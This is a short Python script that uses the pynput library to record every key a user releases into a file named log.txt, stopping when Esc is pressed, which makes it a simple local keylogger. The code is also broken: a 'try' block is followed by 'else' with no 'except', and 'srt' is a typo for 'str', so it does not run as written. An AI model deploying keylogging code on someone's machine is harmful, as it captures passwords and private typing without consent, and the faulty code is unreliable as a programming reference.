from pynput.keyboard import Listener, Key

def log(key):
    with open("log.txt", "a") as file_log:
        file_log.write(key)

def monitor(key):
    try:
        log(key.char)
    else:
        log(srt(key))
    if key == Key.esc:
        return False

with Listener(on_release=monitor) as listener:
    listener.join()
